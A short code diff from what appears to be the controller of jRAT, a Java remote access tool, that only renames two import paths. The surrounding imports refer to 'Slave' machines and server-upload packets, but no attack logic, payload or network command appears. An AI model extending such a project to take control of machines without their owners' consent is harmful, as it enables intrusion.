@@ -1,7 +1,7 @@
 package jrat.controller.threads;
 
-import io.jrat.common.TransferRunnable;
-import io.jrat.common.io.TransferData;
+import jrat.common.TransferRunnable;
+import jrat.common.io.TransferData;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet103CompleteServerUpload;
 import jrat.controller.packets.outgoing.Packet104ServerUploadPart;
